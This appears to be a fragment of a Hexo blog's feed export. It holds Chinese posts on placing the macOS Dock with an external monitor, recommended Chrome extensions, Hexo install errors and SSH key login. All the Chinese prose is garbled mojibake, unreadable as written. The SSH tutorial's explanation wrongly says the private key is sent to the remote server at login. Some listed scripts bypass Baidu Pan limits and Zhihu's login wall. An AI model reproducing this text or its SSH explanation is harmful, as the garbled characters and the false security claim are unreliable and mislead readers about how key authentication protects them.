åŸæ¥å·²å°†Dockæ”¾åœ¨å°å±å¹•çš„å·¦/å³ä¾§ï¼Œè€Œç°åœ¨Dockä»åœ¨å°å±å¹•ä¸Šï¼Œé‚£ä¹ˆï¼Œè¿˜è¦å°†Dockç§»åˆ°å¤§å±å¹•ä¸Šã€‚æ–¹æ³•æ˜¯ï¼šå³é”®ç‚¹å‡»â€œDockâ€çš„â€œæ–‘é©¬çº¿â€åˆ†éš”ç¬¦ï¼Œé€‰æ‹©â€œç½®äºå±å¹•ä¸Šçš„ä½ç½®-å·¦è¾¹/å³è¾¹â€ï¼Œå°†Dockè®¾ç½®åˆ°å¤§å±ä¾§è¾¹ã€‚æ³¨æ„ï¼šå¦‚æœä½ å–œæ¬¢å°†Dockæ”¾åœ¨ä¸»å±å¹•çš„å³è¾¹ï¼Œé‚£ä¹ˆï¼Œå¼€å§‹å®‰æ’ä½ç½®çš„æ—¶å€™ï¼Œä½ çš„æœ¬æœ¬å°±åº”è¯¥æ”¾åœ¨å¤–ç½®æ˜¾ç¤ºå™¨çš„å·¦è¾¹ï¼Œå› ä¸ºä½ çš„å¤§å±æ˜¯å°å±å¹•çš„â€œæ‰©å±•â€ï¼›åä¹‹äº¦ç„¶ã€‚</p></li><li><p>å¦‚æœéœ€è¦çš„è¯ï¼Œé€‰ä¸­â€œåœ¨èœå•ä¸­æ˜¾ç¤ºæ˜¾ç¤ºå™¨å›¾æ ‡â€ï¼Œåœ¨æ¡Œé¢é¡¶éƒ¨èœå•ä¸­å‡ºç°æ˜¾ç¤ºå™¨å›¾æ ‡ï¼Œæ–¹ä¾¿ä»¥åæ›´æ”¹è®¾ç½®ã€‚</p></li><li><p>å¦‚æœä½ è¦å…³é—­æœ¬æœ¬çš„å°å±å¹•ã€åªç”¨å¤–ç½®å¤§å±å¹•ï¼Œé‚£ä¹ˆï¼Œåªè¦åˆä¸Šæœ¬æœ¬çš„ç›–å­ï¼Œå‡ ç§’åå¤§å±å¹•è‡ªåŠ¨é»‘å±åå†å˜äº®ï¼Œä½ å°±å¯ä»¥ç”¨é¼ æ ‡åœ¨å¤§å±å¹•ä¸Šæ“ä½œäº†ã€‚å¦‚æœä½ è¦è¾“å…¥æ–‡å­—ï¼Œé‚£ä¹ˆï¼Œè¿˜éœ€è¦æ·»åŠ ä¸€ä¸ªé”®ç›˜ï¼ˆUSBæˆ–è“ç‰™ã€æ— çº¿çš„éƒ½å¯ä»¥ï¼‰</p></li><li><p>å¦‚æœä½ è§‰å¾—åœ¨å¤–æ¥æ˜¾ç¤ºå™¨åç§»åŠ¨é¼ æ ‡å˜å¾—è´¹åŠ›ï¼Œé‚£ä½ å¯ä»¥è¯•è¯•åœ¨Chromeæˆ–Firefoxä¸‹å®‰è£…Vimiumæ‰©å±•ï¼Œè¿™æ ·å°±å¯ä»¥æ— éœ€é¼ æ ‡ç•…æ¸¸webäº†<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0rgw8jy5j30lq0fpad7.jpg" alt="Vimium"></p></li></ol><p>Windowsä¸‹çš„è®¾ç½®å¤§åŒå°å¼‚ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Chromeæ’ä»¶æ¨è</title>
      <link href="/post/chrome-extension/"/>
      <url>/post/chrome-extension/</url>
      
        <content type="html"><![CDATA[<p>æ‰©å±•æ¨èåˆ—è¡¨</p><h3 id="1-Adblock-Plus"><a href="#1-Adblock-Plus" class="headerlink" title="1. Adblock Plus"></a>1. <a href="https://chrome.google.com/webstore/detail/adblock-plus/cfhdojbkjhnklbpkdaibdccddilifddb" target="_blank" rel="noopener">Adblock Plus</a></h3><a id="more"></a><p>   æ¨èç†ç”±ï¼šå¼ºåŠ›å»é™¤å„ç§å¹¿å‘Šï¼ŒåŒ…æ‹¬YouTubeçš„è§†é¢‘å¹¿å‘Šï¼Œä¸è¿‡æ— æ³•è¿‡æ»¤è§†å±å¹¿å‘Šã€‚æœ‰äº›ç½‘ç«™ä¼šåå±è”½å¹¿å‘Šï¼Œå¦åˆ™ä¸èƒ½æµè§ˆé¡µé¢ï¼Œè¿™æ ·çš„ç½‘ç«™åŠ ç™½åå•å°±å¥½äº†ã€‚</p><h3 id="2-Infinityæ–°æ ‡ç­¾é¡µ"><a href="#2-Infinityæ–°æ ‡ç­¾é¡µ" class="headerlink" title="2. Infinityæ–°æ ‡ç­¾é¡µ"></a>2. <a href="https://chrome.google.com/webstore/detail/infinity-new-tab/dbfmnekepjoapopniengjbcpnbljalfg" target="_blank" rel="noopener">Infinityæ–°æ ‡ç­¾é¡µ</a></h3><p>   æ¨èç†ç”±ï¼šä¼˜é›…çš„å›¾æ ‡ã€æ¼‚äº®çš„å£çº¸ï¼Œæ¯æ—¥è‡ªåŠ¨åˆ‡æ¢ï¼Œå¤©å¤©éƒ½æœ‰å¥½å¿ƒæƒ…</p><h3 id="3-Tampermonkey-Firefoxä¸­æ˜¯GreaseMonkeyé™„åŠ ç»„ä»¶"><a href="#3-Tampermonkey-Firefoxä¸­æ˜¯GreaseMonkeyé™„åŠ ç»„ä»¶" class="headerlink" title="3. Tampermonkey(Firefoxä¸­æ˜¯GreaseMonkeyé™„åŠ ç»„ä»¶)"></a>3. <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">Tampermonkey</a>(Firefoxä¸­æ˜¯GreaseMonkeyé™„åŠ ç»„ä»¶)</h3><p>   æ¨èç†ç”±ï¼šè„šæœ¬å·¥å…·çš„ç®¡ç†å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æœ¬åœ°çš„jsæˆ–cssä»£ç æ¥è‡ªå®šä¹‰é¡µé¢ã€‚<br>   ä»¥ä¸‹æ¨èè„šæœ¬åˆ—è¡¨ï¼š</p><ul><li><a href="https://greasyfork.org/zh-CN/scripts/17800-%E8%A7%A3%E5%86%B3%E7%99%BE%E5%BA%A6%E4%BA%91%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E9%99%90%E5%88%B6" target="_blank" rel="noopener">ä¸€è¡Œä»£ç ï¼Œè§£å†³ç™¾åº¦äº‘å¤§æ–‡ä»¶ä¸‹è½½é™åˆ¶</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/24192-kill-baidu-ad" target="_blank" rel="noopener">ç™¾åº¦å¹¿å‘Š(é¦–å°¾æ¨å¹¿åŠå³ä¾§å¹¿å‘Š)æ¸…ç†</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/10582-%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%AB%98%E9%9F%B3%E8%B4%A8%E6%94%AF%E6%8C%81" target="_blank" rel="noopener">ç½‘æ˜“äº‘éŸ³ä¹é«˜éŸ³è´¨æ”¯æŒ</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/6489-zhihu-visitor" target="_blank" rel="noopener">çŸ¥ä¹å…ç™»å½•</a></li></ul><h3 id="4-ç½‘ç›˜åŠ©æ‰‹"><a href="#4-ç½‘ç›˜åŠ©æ‰‹" class="headerlink" title="4. ç½‘ç›˜åŠ©æ‰‹"></a>4. ç½‘ç›˜åŠ©æ‰‹</h3><p>   æ¨èç†ç”±ï¼šæœ¬åœ°å®‰è£…Aria2åé…åˆæ­¤æ‰©å±•ç»•è¿‡ç™¾åº¦äº‘é™é€Ÿä¸å®¢æˆ·ç«¯å¤§å°é™åˆ¶</p><h3 id="5-Proxy-SwitchyOmega"><a href="#5-Proxy-SwitchyOmega" class="headerlink" title="5. Proxy SwitchyOmega"></a>5. <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">Proxy SwitchyOmega</a></h3><p>   æ¨èç†ç”±ï¼šè½»æ¾å¿«æ·ç®¡ç†å’Œåˆ‡æ¢ä»£ç†ï¼Œä»ç„¶è®°å¾—å½“å¹´GAEå’Œè¿™ä¸ªé…åˆç¿»GFW</p><h3 id="6-OneTab"><a href="#6-OneTab" class="headerlink" title="6. OneTab"></a>6. <a href="https://chrome.google.com/webstore/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall" target="_blank" rel="noopener">OneTab</a></h3><p>   ç”±äºChromeç‰¹åˆ«æ¶ˆè€—å†…å­˜ï¼Œå¯¹äºé‚£äº›æˆ‘ä»¬æš‚æ—¶ä¸çœ‹çš„é¡µé¢ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æ”¶é›†åˆ°OneTabä¸­ï¼Œé™ä½ç³»ç»Ÿå†…å­˜æ¶ˆè€—</p><h3 id="7-JSON-Viewer"><a href="#7-JSON-Viewer" class="headerlink" title="7. JSON Viewer"></a>7. JSON Viewer</h3><p>   æ¨èç†ç”±ï¼šå°†jsonæ ¼å¼çš„æ•°æ®æ ¼å¼åŒ–è¾“å‡ºï¼Œæ–¹ä¾¿é˜…è¯»ã€‚ç”±äºä¹‹å‰çš„JSONViewè¢«æç¤ºæœ‰å®‰å…¨æ¼æ´ï¼Œå°±è½¬ä¸ºè¿™ä¸ªäº†ã€‚</p><h3 id="8-Vimium"><a href="#8-Vimium" class="headerlink" title="8. Vimium"></a>8. <a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Vimium</a></h3><p>   æ¨èç†ç”±ï¼šå¿˜æ‰é¼ æ ‡å§ï¼Œç”¨Vimçš„å¿«æ·é”®æ¥æµè§ˆç½‘é¡µï¼Œå¿«é€Ÿå‡†ç¡®æ‰¾åˆ°ä½ æƒ³è¦çš„</p><h3 id="9-Xdebug-helper"><a href="#9-Xdebug-helper" class="headerlink" title="9. Xdebug helper"></a>9. <a href="https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc" target="_blank" rel="noopener">Xdebug helper</a></h3><p>   æ¨èç†ç”±ï¼šé…åˆIDEè°ƒè¯•ä»£ç ï¼Œç¨‹åºå‘˜å¿…å¤‡ç¥å™¨</p><h3 id="10-Postman"><a href="#10-Postman" class="headerlink" title="10. Postman"></a>10. <a href="https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop" target="_blank" rel="noopener">Postman</a></h3><p>æ¨èç†ç”±ï¼šPostmanæ˜¯è°ƒè¯•web apiçš„ä¸€æ¬¾åˆ©å™¨ï¼Œå®ƒèƒ½å¤Ÿå‘é€ä»»ä½•ç±»å‹çš„HTTP requests (GET, HEAD, POST, PUT..)ï¼Œé™„å¸¦ä»»ä½•æ•°é‡çš„å‚æ•°+ headersã€‚</p><p>æ”¯æŒä¸åŒçš„è®¤è¯æœºåˆ¶ï¼ˆbasic, digest, OAuthï¼‰ï¼Œæ¥æ”¶åˆ°çš„å“åº”è¯­æ³•é«˜äº®ï¼ˆHTMLï¼ŒJSONæˆ–XMLï¼‰ã€‚</p><p>Postman èƒ½å¤Ÿä¿ç•™äº†å†å²çš„è¯·æ±‚ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°é‡æ–°å‘é€è¯·æ±‚ï¼Œæœ‰ä¸€ä¸ªâ€œé›†åˆâ€åŠŸèƒ½ï¼Œç”¨äºå­˜å‚¨æ‰€æœ‰è¯·æ±‚ç›¸åŒçš„API/åŸŸã€‚</p><h3 id="11-EditThisCookie"><a href="#11-EditThisCookie" class="headerlink" title="11. EditThisCookie"></a>11. <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener">EditThisCookie</a></h3><p>æ¨èç†ç”±ï¼šEditThisCookieæ˜¯ä¸€ä¸ªcookieç®¡ç†å™¨ã€‚æ‚¨å¯ä»¥æ·»åŠ ï¼Œåˆ é™¤ï¼Œç¼–è¾‘ï¼Œæœç´¢ï¼Œé”å®šå’Œå±è”½cookiesï¼</p><h3 id="12-FeHelper"><a href="#12-FeHelper" class="headerlink" title="12. FeHelper"></a>12. <a href="https://chrome.google.com/webstore/detail/web%E5%89%8D%E7%AB%AF%E5%8A%A9%E6%89%8Bfehelper/pkgccpejnmalmdinmhkkfafefagiiiad" target="_blank" rel="noopener">FeHelper</a></h3><p>æ¨èç†ç”±ï¼šæä¾›äº†å¾ˆå¤šå¸¸ç”¨çš„FEå·¥å…·ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ç¼–è§£ç ã€å›¾ç‰‡base64ç¼–ç ã€ä»£ç å‹ç¼©ã€ç¾åŒ–ã€JSONæ ¼å¼åŒ–ã€æ­£åˆ™è¡¨è¾¾å¼ã€æ—¶é—´è½¬æ¢å·¥å…·ã€äºŒç»´ç ç”Ÿæˆå™¨ã€ç¼–ç è§„èŒƒæ£€æµ‹ã€é¡µé¢æ€§èƒ½æ£€æµ‹ã€æ …æ ¼æ£€æµ‹ã€JSè¿è¡Œæ•ˆç‡åˆ†æç­‰ã€‚</p><p>éå¸¸å®ç”¨ï¼Œå¼ºçƒˆæ¨èï¼</p><h3 id="13-åˆ’è¯ç¿»è¯‘"><a href="#13-åˆ’è¯ç¿»è¯‘" class="headerlink" title="13. åˆ’è¯ç¿»è¯‘"></a>13. <a href="https://chrome.google.com/webstore/detail/%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/ikhdkkncnoglghljlkmcimlnlhkeamad" target="_blank" rel="noopener">åˆ’è¯ç¿»è¯‘</a></h3><p>æ¨èç†ç”±ï¼šä¸€ä¸ªç®€ä¾¿ä½†å¼ºå¤§çš„ç¿»è¯‘æ‰©å±•ã€‚æ”¯æŒè°·æ­Œã€ç™¾åº¦ã€æœ‰é“ã€å¿…åº”å››å¤§ç¿»è¯‘å’Œæœ—è¯»å¼•æ“ï¼Œå¯ä»¥æ–¹ä¾¿çš„æŸ¥çœ‹ã€å¤åˆ¶å’Œæœ—è¯»ä¸åŒå¼•æ“çš„ç¿»è¯‘ç»“æœã€‚</p><p>å¯¹é˜…è¯»è‹±æ–‡æ–‡æ¡£éå¸¸æœ‰å¸®åŠ©ã€‚</p><h3 id="14-è±†è—¤"><a href="#14-è±†è—¤" class="headerlink" title="14.è±†è—¤"></a>14.<a href="http://www.douban.com/note/481190431/" target="_blank" rel="noopener">è±†è—¤</a></h3><p>æ¨èç†ç”±ï¼šè±†ç“£æ˜¯ä¸ªå¥½ç½‘ç«™ï¼Œæ‰¾ä¹¦æ‰¾ç”µå½±å…ˆå»è±†ç“£é€›é€›ï½è±†è—¤å¯ä»¥ä¸€é”®æ‰¾å‡ºç”µå½±ã€ä¹¦ç±çš„ä¸‹è½½åœ°å€ï¼Œè¿˜æä¾›äº†å¾ˆå¤šè±†ç“£çš„å¾ˆå¤šå°åŠŸèƒ½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome </tag>
            
            <tag> æµè§ˆå™¨ </tag>
            
            <tag> æ’ä»¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoé‡åˆ°çš„é‚£äº›å‘</title>
      <link href="/post/hexo-error/"/>
      <url>/post/hexo-error/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œè´´ä¸Šæˆ‘æ­å»ºæˆåŠŸçš„æ•™ç¨‹åœ°å€ <a href="https://xuanwo.org/2015/03/26/hexo-intor/" target="_blank" rel="noopener">å²ä¸Šæœ€è¯¦ç»†çš„Hexoåšå®¢æ­å»ºå›¾æ–‡æ•™ç¨‹</a></p><a id="more"></a><p>å…¶æ¬¡ï¼Œè¿™ä¸ªåšå®¢é‡Œè¿˜æœ‰hexoä¸­å¸¸è§çš„é—®é¢˜ <a href="https://xuanwo.org/2014/08/14/hexo-usual-problem/" target="_blank" rel="noopener">Hexoå¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</a></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥è°ˆè°ˆæˆ‘åœ¨æ­å»ºæ—¶é‡åˆ°çš„ä¸€äº›å‘ï¼š</p><h3 id="1-hexoçš„3è¡ŒæŠ¥é”™-DTrace-é”™è¯¯"><a href="#1-hexoçš„3è¡ŒæŠ¥é”™-DTrace-é”™è¯¯" class="headerlink" title="1. hexoçš„3è¡ŒæŠ¥é”™(DTrace é”™è¯¯)"></a>1. hexoçš„3è¡ŒæŠ¥é”™(DTrace é”™è¯¯)</h3>   <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/Release/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/default/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/Debug/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br></pre></td></tr></table></figure><p>   å‡ºç°è¿™ç§æƒ…å†µæ˜¯å› ä¸ºGFWå¯¼è‡´npmä¸‹è½½è¿‡ç¨‹ä¸­ä¾èµ–åº“ä¸å®Œæ•´</p><p>   è§£å†³åŠæ³•ï¼š</p><p>   æ›´æ¢å›½å†…é•œåƒ<a href="http://www.jianshu.com/p/0deb70e6f395" target="_blank" rel="noopener">http://www.jianshu.com/p/0deb70e6f395</a><br>   ç„¶å å¸è½½å¹¶é‡æ–°å®‰è£…<br>   <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm uninstall hexo-<span class="keyword">cli</span> -g</span><br><span class="line">$ npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><br>   æˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…è§£å†³<br>   <figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">npm</span> install hexo --<span class="literal">no</span>-optional</span><br></pre></td></tr></table></figure><br>   åæ­£æˆ‘æ˜¯ç”¨çš„æ›´æ¢æºçš„åŠæ³•è§£å†³çš„ï¼Œè¿™æ ·è§£å†³çš„æ›´å½»åº•ï¼Œé€Ÿåº¦æå‡äº†ä¸åªä¸€ä¸ªé‡çº§ã€‚</p><h3 id="2-åšå®¢åœ¨æœ¬åœ°æµ‹è¯•æ­£å¸¸ï¼Œéƒ¨ç½²åˆ°çº¿ä¸Šæ²¡æœ‰æ ·å¼"><a href="#2-åšå®¢åœ¨æœ¬åœ°æµ‹è¯•æ­£å¸¸ï¼Œéƒ¨ç½²åˆ°çº¿ä¸Šæ²¡æœ‰æ ·å¼" class="headerlink" title="2. åšå®¢åœ¨æœ¬åœ°æµ‹è¯•æ­£å¸¸ï¼Œéƒ¨ç½²åˆ°çº¿ä¸Šæ²¡æœ‰æ ·å¼"></a>2. åšå®¢åœ¨æœ¬åœ°æµ‹è¯•æ­£å¸¸ï¼Œéƒ¨ç½²åˆ°çº¿ä¸Šæ²¡æœ‰æ ·å¼</h3><p>   è¿™ä¸ªæƒ…å†µæˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°ï¼Œæ ·å¼çš„ç›¸å…³æ–‡ä»¶åŠ è½½æŠ¥äº†404é”™è¯¯ï¼Œå°±æ˜¯å› ä¸ºè·¯å¾„çš„å¡«å†™é—®é¢˜ï¼Œæ³¨æ„hexoå®˜ç½‘å¯¹äºç½‘å€è·¯å¾„çš„è§£é‡Š<br>   <img src="https://tva1.sinaimg.cn/large/0082zybply1gc0pdw9ahkj30jy03fwes.jpg" alt="åšå®¢è·¯å¾„é—®é¢˜"></p><h3 id="3-hexo-gå‘½ä»¤æŠ¥é”™"><a href="#3-hexo-gå‘½ä»¤æŠ¥é”™" class="headerlink" title="3. hexo gå‘½ä»¤æŠ¥é”™"></a>3. <code>hexo g</code>å‘½ä»¤æŠ¥é”™</h3><p>   <img src="https://tva1.sinaimg.cn/large/0082zybply1gc0pellxs8j30js06k40l.jpg" alt="æ¸²æŸ“æŠ¥é”™"><br>   å¦‚æœé‡åˆ°hexo gæŠ¥é”™çš„æƒ…å†µï¼Œè¿™å¹¶ä¸æ˜¯ç”±äºæ–‡ä»¶çš„æƒé™é—®é¢˜å¯¼è‡´çš„ï¼ŒåŒæ ·æ˜¯ç”±äºymlä¸¥æ ¼çš„è¯­æ³•é—®é¢˜å¯¼è‡´çš„ï¼Œè¿™ä¸ªé—®é¢˜å¯¼è‡´æˆ‘ç”¨IDEæ‰“å¼€åšå®¢æ—¶éƒ½ä¼šå¡æ­»<br>   <img src="https://tva1.sinaimg.cn/large/0082zybply1gc0pfdstj5j30eh03bweu.jpg" alt="æ¸²æŸ“æŠ¥é”™æ ¹æº"></p><p>   å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç¼–è¾‘ymlæ–‡ä»¶æ—¶è¦æ ¼å¤–çš„å°å¿ƒï¼Œé™¤äº†<code>:</code>å<strong>å¿…é¡»</strong>æœ‰ç©ºæ ¼å¤–ï¼Œå…¶ä¸­çš„ç¼©è¿›ä¹Ÿæ˜¯æœ‰ä¸¥æ ¼è¦æ±‚çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨çº¿ç½‘ç«™<a href="http://www.yamllint.com/" target="_blank" rel="noopener">YAML Lint</a>æ¥å¸®åŠ©æˆ‘ä»¬æ’é”™ï¼Œä»¥å…å› ä¸ºymlçš„æ ¼å¼é—®é¢˜è€—è´¹å¤ªå¤šçš„æ—¶é—´ã€‚</p><h3 id="4-Hexoå¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ"><a href="#4-Hexoå¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ" class="headerlink" title="4. Hexoå¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ"></a>4. Hexoå¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</h3><p><a href="https://xuanwo.org/2014/08/14/hexo-usual-problem/" target="_blank" rel="noopener">https://xuanwo.org/2014/08/14/hexo-usual-problem/</a></p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSHå¯†é’¥ç™»å½•æ•™ç¨‹</title>
      <link href="/post/ssh-login-tutorial/"/>
      <url>/post/ssh-login-tutorial/</url>
      
        <content type="html"><![CDATA[<p>ä»æ­¤å†ä¹Ÿä¸æ€•å¿˜è®°å¯†ç äº†;)</p><a id="more"></a><h3 id="Step-1ï¼šæ£€æŸ¥å¯†é’¥"><a href="#Step-1ï¼šæ£€æŸ¥å¯†é’¥" class="headerlink" title="Step 1ï¼šæ£€æŸ¥å¯†é’¥"></a>Step 1ï¼šæ£€æŸ¥å¯†é’¥</h3><p>æŸ¥çœ‹æœ¬æœº~/.ssh/ç›®å½•ä¸‹æ˜¯å¦æœ‰sshå…¬é’¥(id_rsa.pub)å’Œç§é’¥(id_rsa)ï¼Œå¦‚æœæ²¡æœ‰æˆ–è€…å¹²è„†è¿.sshç›®å½•éƒ½ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆè¯·ä½¿ç”¨<code>ssh-keygen -t rsa -C &quot;email@example.com&quot;</code>æ¥åˆ›å»ºsshå¯†é’¥ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qvb2bxuj30k7058dh2.jpg" alt="ç”ŸæˆSSHå¯†é’¥"></p><p>å®ƒå…ˆè¦æ±‚ä½ ç¡®è®¤ä¿å­˜å…¬é’¥çš„ä½ç½®ï¼ˆ.ssh/id_rsaï¼‰ï¼Œç„¶åå®ƒä¼šè®©ä½ é‡å¤ä¸€ä¸ªå¯†ç ä¸¤æ¬¡ï¼Œå¦‚æœä¸æƒ³åœ¨ä½¿ç”¨å…¬é’¥çš„æ—¶å€™è¾“å…¥å¯†ç ï¼Œå¯ä»¥ç•™ç©ºã€‚</p><h3 id="Step-2ï¼šå°†å…¬é’¥æ”¾ç½®åˆ°è¿œç¨‹æœåŠ¡å™¨"><a href="#Step-2ï¼šå°†å…¬é’¥æ”¾ç½®åˆ°è¿œç¨‹æœåŠ¡å™¨" class="headerlink" title="Step 2ï¼šå°†å…¬é’¥æ”¾ç½®åˆ°è¿œç¨‹æœåŠ¡å™¨"></a>Step 2ï¼šå°†å…¬é’¥æ”¾ç½®åˆ°è¿œç¨‹æœåŠ¡å™¨</h3><p>å°†æœ¬æœºçš„<strong>å…¬é’¥.ssh/id_rsa.pub</strong>æ”¾ç½®åœ¨è¿œç¨‹æœåŠ¡å™¨å¯¹åº”ç”¨æˆ·åç›®å½•ï¼ˆå¦‚/root/.sshï¼‰ä¸‹çš„<code>/.ssh/authorized_keys</code>ä¸­ï¼Œä¸€è¡Œä¸€ä¸ªï¼Œå¹¶ä¸”å°†.sshå’Œauthorized_keysæƒé™è®¾ç½®ä¸º700å’Œ600ã€‚<br>ä¸€ä¸ªä¾¿æ·çš„å‘½ä»¤ï¼š<code>ssh-copy-id -i ~/.ssh/id_rsa.pub  root@192.168.0.3  [-pport]</code></p><ul><li>è¯¥å‘½ä»¤ä¼šè‡ªåŠ¨å°†æœ¬åœ°çš„sshå…¬é’¥å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºçš„authorized_keysæ–‡ä»¶ä¸­ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨è®¾ç½®ç›¸å…³æƒé™ã€‚</li><li>è‹¥ä¸æ”¯æŒè¯¥å‘½ä»¤è¯·æ‰‹åŠ¨å¤åˆ¶id_rsa.pubå†…å®¹åˆ°è¿œç¨‹ä¸»æœºçš„authorized_keysï¼ˆä¸å­˜åœ¨è¯·åˆ›å»ºï¼‰ï¼Œæˆ–è€…ä½¿ç”¨ftpæˆ–sftpæ‹·è´åé‡å‘½åã€‚</li></ul><h3 id="Step-3-è®¾ç½®æœ¬åœ°ssh"><a href="#Step-3-è®¾ç½®æœ¬åœ°ssh" class="headerlink" title="Step 3:è®¾ç½®æœ¬åœ°ssh"></a>Step 3:è®¾ç½®æœ¬åœ°ssh</h3><p>è®¾ç½®~/.sshç›®å½•ä¸‹çš„configæ–‡ä»¶</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qw9s0z9j30g2035t97.jpg" alt="é…ç½®SSH"></p><h3 id="Step-4-ä½¿ç”¨sshå¯†é’¥ç™»å½•"><a href="#Step-4-ä½¿ç”¨sshå¯†é’¥ç™»å½•" class="headerlink" title="Step 4:ä½¿ç”¨sshå¯†é’¥ç™»å½•"></a>Step 4:ä½¿ç”¨sshå¯†é’¥ç™»å½•</h3><p>ä½¿ç”¨ssh+åˆ«åç™»å½•</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qwsr5qpj30fp01qjrk.jpg" alt="ä½¿ç”¨SSHå¯†é’¥ç™»å½•"></p><p>PS:å¦‚æœä½ é…ç½®sshå…å¯†é’¥ç™»å½•å¤±è´¥æ—¶ï¼Œæ£€æŸ¥ä¸€ä¸‹</p><ol><li>ä½ çš„authorized_keysæ–‡ä»¶æ˜¯å¦æ”¾ç½®åœ¨å¯¹åº”ç”¨æˆ·çš„æ–‡ä»¶å¤¹ä¸‹</li><li>ä½ çš„.sshå’Œauthorized_keysçš„æƒé™è®¾ç½®æ˜¯å¦æ­£ç¡®</li></ol><h3 id="é™„ï¼šsshåŸç†"><a href="#é™„ï¼šsshåŸç†" class="headerlink" title="é™„ï¼šsshåŸç†"></a>é™„ï¼šsshåŸç†</h3><p>sshå¯†é’¥ç™»å½•çš„åŸç†ï¼šå½“æˆ‘ä»¬ä½¿ç”¨æ™®é€šæ–¹å¼ç™»å½•æ—¶ï¼Œè¿œç¨‹ä¸»æœºé€šè¿‡/etc/shadowéªŒè¯ç”¨æˆ·åå’Œå¯†ç ã€‚è€Œå½“æˆ‘ä»¬é…ç½®å¥½äº†sshå¯†é’¥ç™»å½•æ—¶ï¼Œæˆ‘ä»¬æ¯æ¬¡å‘é€ç™»å½•è¯·æ±‚æ—¶éƒ½ä¼šæºå¸¦æœ¬æœºçš„ç§é’¥å‰å¾€è¿œç¨‹ä¸»æœºï¼Œè¿œç¨‹ä¸»æœºæ”¶åˆ°ç™»å½•è¯·æ±‚åï¼Œä¸å†å»/etc/shadowæ ¡éªŒï¼Œè€Œè½¬å»authorized_keysæŸ¥çœ‹æ˜¯å¦å·²ç»å­˜åœ¨å¯¹åº”çš„å…¬é’¥ï¼ˆå› ä¸ºsshçš„å¯†é’¥æ˜¯æˆå¯¹ç”Ÿæˆçš„ï¼Œæ‰€ä»¥fingerprintæ˜¯ä¸€æ ·çš„ï¼‰ï¼Œæ ¡éªŒæˆåŠŸåˆ™ç™»å½•æˆåŠŸï¼Œå¦åˆ™æ‹’ç»ç™»å½•è¯·æ±‚ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qxki3y9j30e60qhn01.jpg" alt="sshå·¥ä½œåŸç†"></p>]]></content>
      
      
      <categories>
          
